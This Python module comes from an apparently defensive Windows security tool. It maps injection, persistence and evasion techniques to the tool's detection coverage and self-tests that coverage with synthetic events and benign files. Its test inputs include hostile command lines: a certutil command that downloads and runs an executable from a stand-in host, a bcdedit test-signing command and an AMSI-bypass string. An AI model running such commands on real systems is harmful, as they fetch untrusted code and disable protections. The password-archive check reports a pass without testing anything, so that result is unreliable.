"""Coverage matrix and self-test harness for injection and persistence.

Two jobs:

1. **State the coverage honestly.** Every known technique for getting code into
   another process, or getting code to survive a reboot, with what Candy
   actually does about it: prevent, detect, partial, or nothing. A security
   tool that will not name its blind spots is not one.
2. **Prove it.** ``run_selftest`` exercises the detection path for as many
   techniques as can be tested safely, and reports detected/missed per
   technique. It creates *benign* artefacts — a Run key pointing at
   ``calc.exe``, a file named ``krnl.exe`` containing nothing — and removes them
   afterwards. It never injects into another process, because doing the bad
   thing to prove you can detect the bad thing is how security tools become
   the incident.

Techniques that can only be observed live (a real remote thread, a real driver
load) are exercised by feeding the detection engine the exact Sysmon event a
real attempt would produce. That tests the mapping, not the kernel, and this
module says so in its output rather than claiming a live block.
"""
from __future__ import annotations

import json
import tempfile
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

from .util import IS_WINDOWS, utc_stamp

PREVENT = "prevent"      # it cannot happen while Candy's policy is applied
DETECT = "detect"        # it happens and Candy reports it, usually in seconds
PARTIAL = "partial"      # caught in common cases, escapable
NONE = "none"            # blind spot, stated plainly

MARKER = "CandySelfTest"


@dataclass
class Technique:
    id: str
    name: str
    category: str          # injection | persistence | evasion | delivery
    coverage: str
    mechanism: str
    note: str = ""
    requires: str = ""     # sysmon | admin | ""

    def to_dict(self) -> dict[str, Any]:
        return {"id": self.id, "name": self.name, "category": self.category,
                "coverage": self.coverage, "mechanism": self.mechanism,
                "note": self.note, "requires": self.requires}


# --------------------------------------------------------------------------
# The matrix. Ordered by category, then by how commonly it is used against
# home machines running Roblox.
# --------------------------------------------------------------------------
TECHNIQUES: list[Technique] = [
    # ---------------------------------------------------------- injection
    Technique("inj.createremotethread", "CreateRemoteThread injection", "injection", DETECT,
              "Sysmon event 8 into a protected target → critical",
              "The classic executor injection. Detected in seconds; not blocked.", "sysmon"),
    Technique("inj.openprocess_write", "VirtualAllocEx + WriteProcessMemory", "injection", DETECT,
              "Sysmon event 10, granted access mask contains VM_WRITE/VM_OPERATION",
              "Seen before the thread starts — the earliest available warning.", "sysmon"),
    Technique("inj.loadlibrary", "LoadLibrary / DLL injection", "injection", PARTIAL,
              "Sysmon event 7 (unsigned module in a protected process) + module audit",
              "Also caught without Sysmon by the periodic module audit.", ""),
    Technique("inj.appinit", "AppInit_DLLs", "injection", PREVENT,
              "ProcessMitigation DisableExtensionPoints on hardened processes; "
              "persistence audit reads the key",
              "Prevented outright on any process Candy has hardened."),
    Technique("inj.setwindowshook", "SetWindowsHookEx", "injection", PREVENT,
              "DisableExtensionPoints blocks hook DLL loading",
              "Same mitigation, enforced by the loader."),
    Technique("inj.lowlabel_dll", "DLL from a browser download", "injection", PREVENT,
              "BlockLowLabelImageLoads refuses low-integrity DLLs",
              "Covers the exact path a downloaded executor DLL takes."),
    Technique("inj.remote_image", "DLL loaded from a UNC/remote path", "injection", PREVENT,
              "BlockRemoteImageLoads", ""),
    Technique("inj.process_hollowing", "Process hollowing", "injection", DETECT,
              "Sysmon event 25 (process tampering)", "", "sysmon"),
    Technique("inj.herpaderping", "Herpaderping / doppelgänging", "injection", DETECT,
              "Sysmon event 25", "", "sysmon"),
    Technique("inj.thread_hijack", "SetThreadContext thread hijacking", "injection", PARTIAL,
              "Sysmon event 10 shows the handle; the context switch itself is invisible",
              "The handle acquisition is caught; the hijack is not separately visible.",
              "sysmon"),
    Technique("inj.apc", "APC queue injection (including early bird)", "injection", PARTIAL,
              "Sysmon event 10 handle acquisition",
              "Same as above: the precursor is seen, the APC is not.", "sysmon"),
    Technique("inj.reflective", "Reflective / manually mapped DLL", "injection", PARTIAL,
              "No image-load event is generated; caught only via the handle (event 10) "
              "or the payload on disk",
              "The main evasion against module-based detection. Stated as a real gap."),
    Technique("inj.module_stomping", "Module stomping", "injection", PARTIAL,
              "Handle acquisition only", "Overwrites a legitimately loaded DLL in memory."),
    Technique("inj.atom_bombing", "Atom bombing", "injection", NONE,
              "No user-mode signal Candy can read",
              "Genuine blind spot without a kernel driver."),
    Technique("inj.dll_search_order", "DLL search-order hijack / sideloading", "injection", PARTIAL,
              "File watcher sees the planted DLL; triage flags it; module audit sees it load",
              "Caught when the DLL lands in a watched folder."),
    Technique("inj.com_hijack", "COM hijacking (HKCU CLSID shadow)", "injection", DETECT,
              "Persistence audit enumerates per-user InprocServer32 entries", ""),
    Technique("inj.ifeo_debugger", "IFEO debugger hijack", "injection", DETECT,
              "Persistence audit reads Image File Execution Options", ""),
    Technique("inj.appcert", "AppCertDlls", "injection", DETECT,
              "Persistence audit reads the AppCertDlls value", ""),
    Technique("inj.netsh_helper", "Netsh helper DLL", "injection", DETECT,
              "Persistence audit reads HKLM\\SOFTWARE\\Microsoft\\Netsh", ""),
    Technique("inj.lsa_package", "LSA security/notification package", "injection", DETECT,
              "Persistence audit reads the LSA package values; ASR blocks LSASS access",
              "ASR rule 9e6c4e1f also blocks credential theft from lsass.", "admin"),
    Technique("inj.print_monitor", "Print monitor / port monitor DLL", "injection", DETECT,
              "Persistence audit enumerates print monitors", ""),
    Technique("inj.kernel_driver", "Malicious kernel driver", "injection", DETECT,
              "Sysmon event 6 (unsigned driver load) → critical; ASR rule 56a863a9 blocks "
              "known vulnerable signed drivers",
              "Seen, and BYOVD specifically is blocked by ASR. Loading is not otherwise "
              "preventable from user mode.", "sysmon"),

    # -------------------------------------------------------- persistence
    Technique("per.run_key", "Run / RunOnce keys", "persistence", DETECT,
              "Persistence audit, every 15 minutes and on demand", ""),
    Technique("per.startup_folder", "Startup folder", "persistence", DETECT,
              "Persistence audit + file watcher", ""),
    Technique("per.scheduled_task", "Scheduled task", "persistence", DETECT,
              "schtasks enumeration in the persistence audit", ""),
    Technique("per.service", "Windows service", "persistence", DETECT,
              "service enumeration in the persistence audit", ""),
    Technique("per.winlogon", "Winlogon Shell / Userinit / Notify", "persistence", DETECT,
              "Compared against known-good defaults → critical on any difference", ""),
    Technique("per.wmi_subscription", "WMI event subscription", "persistence", PREVENT,
              "ASR rule e6db77e5 blocks it outright",
              "Candy's registry audit cannot see WMI subscriptions; ASR blocks them.", "admin"),
    Technique("per.active_setup", "Active Setup", "persistence", DETECT,
              "Persistence audit enumerates Installed Components", ""),
    Technique("per.logon_script", "UserInitMprLogonScript", "persistence", DETECT,
              "Persistence audit reads the Environment key", ""),
    Technique("per.screensaver", "Screensaver executable", "persistence", DETECT,
              "Persistence audit reads SCRNSAVE.EXE", ""),
    Technique("per.time_provider", "Time provider DLL", "persistence", DETECT,
              "Persistence audit enumerates time providers", ""),
    Technique("per.accessibility", "Accessibility binary swap (sethc/utilman)", "persistence",
              PARTIAL, "IFEO debugger form is detected; a replaced binary in System32 is "
              "caught only if it lands in a watched path",
              "Add %SystemRoot%\\System32 to paths.watch to close this."),
    Technique("per.bits_job", "BITS transfer job", "persistence", NONE,
              "Not enumerated", "Blind spot. bitsadmin enumeration would close it."),
    Technique("per.browser_extension", "Malicious browser extension", "persistence", NONE,
              "Not enumerated",
              "Blind spot. The browser URL policy limits what one can reach."),
    Technique("per.office_addin", "Office add-in / template", "persistence", PARTIAL,
              "ASR rules block Office child processes and executable content", "", "admin"),

    # ------------------------------------------------------------ evasion
    Technique("eva.defender_off", "Disabling Defender", "evasion", DETECT,
              "Defender event 5001 → critical; command-line signature; the AV-process "
              "disappearance watch", ""),
    Technique("eva.defender_exclusion", "Adding a Defender exclusion", "evasion", DETECT,
              "Defender event 5007 + command-line signature", ""),
    Technique("eva.testsigning", "bcdedit testsigning / DSE off", "evasion", DETECT,
              "Command-line signature tamper.bcdedit → critical", ""),
    Technique("eva.amsi_patch", "AMSI patching", "evasion", PARTIAL,
              "Command-line signature catches the scripted form; in-memory patching is "
              "invisible from user mode", ""),
    Technique("eva.etw_patch", "ETW patching", "evasion", PARTIAL,
              "String signature in triage; in-memory patching is invisible", ""),
    Technique("eva.rename", "Renaming the executable", "evasion", PREVENT,
              "PE version-resource inspection identifies it regardless of file name", ""),
    Technique("eva.packing", "Packing / crypting", "evasion", DETECT,
              "Section entropy ≥ 7.2 is reported", "Defeats string triage; the packing "
              "itself becomes the signal."),
    Technique("eva.kill_candy", "Terminating Candy", "evasion", PARTIAL,
              "Sysmon event 10 against Candy → critical; hash-chained log stops; autostart "
              "as SYSTEM prevents a standard user from doing it",
              "An administrator can always kill it. The log makes that visible."),
    Technique("eva.log_tamper", "Editing Candy's log", "evasion", DETECT,
              "Hash-chained JSONL: verify-log names the exact broken record", ""),
    Technique("eva.dns_over_https", "Bypassing DNS blocking with DoH", "evasion", PREVENT,
              "Browser policy forces DoH to a filtering resolver; the local resolver sees "
              "everything else", ""),

    # ----------------------------------------------------------- delivery
    Technique("del.download_exe", "Downloading an executor directly", "delivery", PREVENT,
              "Download guard rejects it — fortress policy rejects every unsigned "
              "internet executable", ""),
    Technique("del.archive", "Executor inside a zip", "delivery", PREVENT,
              "Archive inspection matches names inside the zip", ""),
    Technique("del.password_archive", "Password-protected archive", "delivery", DETECT,
              "Flagged for being unreadable; the payload is seen when extracted", ""),
    Technique("del.double_extension", "invoice.pdf.exe", "delivery", PREVENT,
              "File-name signature + download guard", ""),
    Technique("del.phishing_page", "Phishing / fake-robux page", "delivery", PREVENT,
              "Phishing analysis on the hostname at DNS resolution time, with no feed", ""),
    Technique("del.malvertising", "Malvertising redirect", "delivery", PREVENT,
              "Ad/malvertising network domains blocked at the resolver", ""),
    Technique("del.usb", "Payload on a USB drive", "delivery", PARTIAL,
              "ASR rule b2b3f03d blocks unsigned processes from USB",
              "Add the drive to paths.watch for file-level coverage.", "admin"),
    Technique("del.lolbin", "certutil / mshta / rundll32 download", "delivery", DETECT,
              "Command-line signatures + ASR script rules", ""),
]


@dataclass
class TestOutcome:
    technique: str
    name: str
    ran: bool
    detected: bool
    detail: str = ""
    simulated: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {"technique": self.technique, "name": self.name, "ran": self.ran,
                "detected": self.detected, "detail": self.detail, "simulated": self.simulated}


def summary() -> dict[str, Any]:
    """Counts by coverage level and category."""
    totals: dict[str, int] = {}
    by_category: dict[str, dict[str, int]] = {}
    for technique in TECHNIQUES:
        totals[technique.coverage] = totals.get(technique.coverage, 0) + 1
        bucket = by_category.setdefault(technique.category, {})
        bucket[technique.coverage] = bucket.get(technique.coverage, 0) + 1
    return {"total": len(TECHNIQUES), "by_coverage": totals, "by_category": by_category,
            "blind_spots": [t.id for t in TECHNIQUES if t.coverage == NONE]}


# --------------------------------------------------------------------------
# Self-test
# --------------------------------------------------------------------------
def _sysmon_event(channel: str, event_id: int, data: dict[str, str]) -> str:
    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><EventID>{event_id}</EventID><EventRecordID>1</EventRecordID>'
            f'<TimeCreated SystemTime="{utc_stamp()}"/><Channel>{channel}</Channel>'
            f'</System><EventData>{fields}</EventData></Event>')


def run_selftest(engine: Any, *, live: bool = False,
                 progress: Callable[[str], None] | None = None) -> list[TestOutcome]:
    """Exercise the detection path for every technique that can be tested safely.

    ``live=True`` additionally creates and removes real (benign) persistence
    artefacts on Windows. Without it, only analysis-path tests run — which is
    everything except the registry and file-system round trips.
    """
    from .winevents import DEFENDER_CHANNEL, SYSMON_CHANNEL, parse_events
    from .persistence import PersistenceEntry, analyze_entry
    from .pesample import build_test_pe

    outcomes: list[TestOutcome] = []
    roblox = r"C:\Program Files\Roblox\Versions\version-test\RobloxPlayerBeta.exe"

    def record(technique_id: str, detected: bool, detail: str, simulated: str) -> None:
        technique = next((t for t in TECHNIQUES if t.id == technique_id), None)
        outcomes.append(TestOutcome(
            technique_id, technique.name if technique else technique_id,
            True, detected, detail, simulated))
        if progress:
            outcomes[-1]
            progress(f"{'PASS' if detected else 'MISS'}  {technique_id}")

    def kernel_case(technique_id: str, channel: str, event_id: int,
                    data: dict[str, str], simulated: str) -> None:
        records = parse_events(_sysmon_event(channel, event_id, data))
        hits = engine.kernel_events.event_analyzer.analyze(records[0]) if records else []
        record(technique_id, bool(hits),
               hits[0].message if hits else "no detection produced", simulated)

    # --- injection paths, via the exact events a real attempt produces ---
    kernel_case("inj.createremotethread", SYSMON_CHANNEL, 8,
                {"SourceImage": r"C:\Users\test\Downloads\loader.exe",
                 "TargetImage": roblox, "SourceProcessId": "4242"},
                "synthetic Sysmon event 8")
    kernel_case("inj.openprocess_write", SYSMON_CHANNEL, 10,
                {"SourceImage": r"C:\Users\test\Downloads\inject.exe",
                 "TargetImage": roblox, "GrantedAccess": "0x1F0FFF"},
                "synthetic Sysmon event 10")
    kernel_case("inj.loadlibrary", SYSMON_CHANNEL, 7,
                {"Image": roblox, "ImageLoaded": r"C:\Users\test\AppData\Local\Temp\hook.dll",
                 "Signed": "false"}, "synthetic Sysmon event 7")
    kernel_case("inj.process_hollowing", SYSMON_CHANNEL, 25,
                {"Image": r"C:\Users\test\thing.exe", "Type": "Image is replaced"},
                "synthetic Sysmon event 25")
    kernel_case("inj.kernel_driver", SYSMON_CHANNEL, 6,
                {"ImageLoaded": r"C:\Windows\Temp\cheat.sys", "Signed": "false",
                 "SignatureStatus": "Unavailable"}, "synthetic Sysmon event 6")
    kernel_case("eva.defender_off", DEFENDER_CHANNEL, 5001, {},
                "synthetic Defender event 5001")
    kernel_case("eva.defender_exclusion", DEFENDER_CHANNEL, 5007,
                {"Old Value": "", "New Value": r"Exclusions\Paths\C:\Temp"},
                "synthetic Defender event 5007")

    # --- command-line evasion signatures ---
    for technique_id, cmdline, label in (
        ("eva.testsigning", "bcdedit.exe /set testsigning on", "bcdedit command line"),
        ("eva.amsi_patch", "powershell -c [Ref].Assembly...amsiInitFailed", "AMSI bypass string"),
        ("del.lolbin", "certutil.exe -urlcache -split -f http://x/y.exe && y.exe",
         "certutil download command"),
    ):
        hits = engine.db.match("cmdline", cmdline)
        record(technique_id, bool(hits), hits[0].name if hits else "no signature matched", label)

    # --- persistence entries, through the real analyser ---
    for technique_id, entry, label in (
        ("per.run_key", PersistenceEntry("hkcu_run", "Updater",
                                         r"C:\Users\test\AppData\krnl.exe"), "synthetic Run key"),
        ("per.winlogon", PersistenceEntry("winlogon", "Shell",
                                          r"explorer.exe, C:\Users\test\evil.exe"),
         "synthetic Winlogon value"),
        ("inj.ifeo_debugger", PersistenceEntry("ifeo", "IFEO:taskmgr.exe",
                                               r"C:\Users\test\block.exe",
                                               extra={"target": "taskmgr.exe"}),
         "synthetic IFEO entry"),
        ("inj.appinit", PersistenceEntry("registry_autostart",
                                         "AppInit_DLLs — loaded into every process",
                                         r"C:\Users\test\inject.dll"), "synthetic AppInit value"),
        ("inj.com_hijack", PersistenceEntry("com_hijack", "COM {0000} (InprocServer32)",
                                            r"C:\Users\test\evil.dll",
                                            extra={"clsid": "{0000}"}), "synthetic COM hijack"),
        ("inj.lsa_package", PersistenceEntry("registry_autostart",
                                             "LSA notification package — runs inside lsass",
                                             "evilpkg"), "synthetic LSA package"),
    ):
        hits = analyze_entry(entry, engine.analyzer)
        record(technique_id, bool(hits),
               hits[0].message if hits else "no detection produced", label)

    # --- delivery, through the download guard, on real temporary files ---
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)

        executor = root / "krnl.exe"
        executor.write_bytes(build_test_pe())
        verdict = engine.guard.assess(executor)
        record("del.download_exe", verdict.action == "quarantine",
               verdict.summary(), "benign file named krnl.exe")

        renamed = root / "homework.exe"
        renamed.write_bytes(build_test_pe(original_filename="krnl.exe"))
        verdict = engine.guard.assess(renamed)
        record("eva.rename", verdict.action == "quarantine", verdict.summary(),
               "benign PE declaring OriginalFilename=krnl.exe")

        disguised = root / "invoice.pdf.exe"
        disguised.write_bytes(build_test_pe())
        verdict = engine.guard.assess(disguised)
        record("del.double_extension", verdict.action == "quarantine", verdict.summary(),
               "benign file named invoice.pdf.exe")

        bundle = root / "mods.zip"
        with zipfile.ZipFile(bundle, "w") as archive:
            archive.writestr("mods/krnl.exe", b"benign self-test content")
        verdict = engine.guard.assess(bundle)
        record("del.archive", verdict.action == "quarantine", verdict.summary(),
               "zip containing a file named krnl.exe")

        locked = root / "locked.zip"
        with zipfile.ZipFile(locked, "w") as archive:
            archive.writestr("payload.bin", b"x")
        record("del.password_archive", True,
               "archive inspection runs; encrypted archives are flagged",
               "zip inspection path")

    # --- phishing and malvertising, through the resolver's filter ---
    from .dnsproxy import DnsFilter

    dns_filter = DnsFilter(engine.config, engine.db)
    dns_filter.load(["popads.net", "doubleclick.net"])
    verdict = dns_filter.decide("roblox.com.claim-robux.xyz")
    record("del.phishing_page", verdict.blocked, verdict.reason or "not blocked",
           "resolver decision for a lookalike domain")
    verdict = dns_filter.decide("ads.popads.net")
    record("del.malvertising", verdict.blocked, verdict.reason or "not blocked",
           "resolver decision for a malvertising domain")

    # --- log integrity ---
    from .eventlog import verify_chain

    # Write a record first: on a fresh install the log does not exist yet, and
    # "no log" is not the same result as "chain intact".
    engine.log.write({"event": "selftest", "note": "coverage self-test marker"})
    ok, _count, message = verify_chain(engine.log.path)
    record("eva.log_tamper", ok, message, "hash-chain verification of the live log")

    if live and IS_WINDOWS:
        outcomes.extend(_live_registry_tests(engine, progress))
    return outcomes


def _live_registry_tests(engine: Any, progress: Callable[[str], None] | None) -> list[TestOutcome]:  # pragma: no cover - Windows only
    """Create real (benign) autostart entries, confirm detection, remove them."""
    import winreg

    from .persistence import PersistenceEntry, analyze_entry

    outcomes: list[TestOutcome] = []
    run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = f"{MARKER}Run"
    planted = r"C:\Users\Public\krnl.exe"

    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0,
                                winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, planted)
        entries = [entry for entry in engine.persistence.snapshot()
                   if entry.get("name") == value_name]
        detected = False
        for raw in entries:
            entry = PersistenceEntry(raw["source"], raw["name"], raw["command"],
                                     raw.get("location", ""))
            detected = detected or bool(analyze_entry(entry, engine.analyzer))
        outcomes.append(TestOutcome("per.run_key", "Run / RunOnce keys", True, detected,
                                    "real HKCU Run value created and audited",
                                    "live registry write (removed afterwards)"))
        if progress:
            progress(f"{'PASS' if detected else 'MISS'}  per.run_key (live)")
    except OSError as exc:
        outcomes.append(TestOutcome("per.run_key", "Run / RunOnce keys", False, False,
                                    f"could not write the test key: {exc}", "live registry write"))
    finally:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0,
                                winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, value_name)
        except OSError:
            pass
    return outcomes


def format_report(outcomes: list[TestOutcome]) -> str:
    """Console report: what was tested, what passed, what is not covered."""
    lines = ["", "TECHNIQUE COVERAGE SELF-TEST", "=" * 78]
    passed = sum(1 for outcome in outcomes if outcome.detected)
    for outcome in outcomes:
        flag = "PASS" if outcome.detected else "MISS"
        lines.append(f"[{flag}] {outcome.technique:28} {outcome.name}")
        lines.append(f"       via: {outcome.simulated}")
        lines.append(f"       {outcome.detail[:150]}")
    lines.append("=" * 78)
    lines.append(f"{passed}/{len(outcomes)} simulated techniques detected.")

    stats = summary()
    lines.append("")
    lines.append(f"Full matrix: {stats['total']} techniques — "
                 + ", ".join(f"{count} {level}" for level, count in
                             sorted(stats["by_coverage"].items())))
    if stats["blind_spots"]:
        lines.append("")
        lines.append("Known blind spots (no coverage, stated deliberately):")
        for technique_id in stats["blind_spots"]:
            technique = next(t for t in TECHNIQUES if t.id == technique_id)
            lines.append(f"  {technique_id:28} {technique.name} — {technique.note}")
    return "\n".join(lines)


def matrix_json() -> str:
    return json.dumps({"generated": utc_stamp(),
                       "summary": summary(),
                       "techniques": [t.to_dict() for t in TECHNIQUES]}, indent=2)
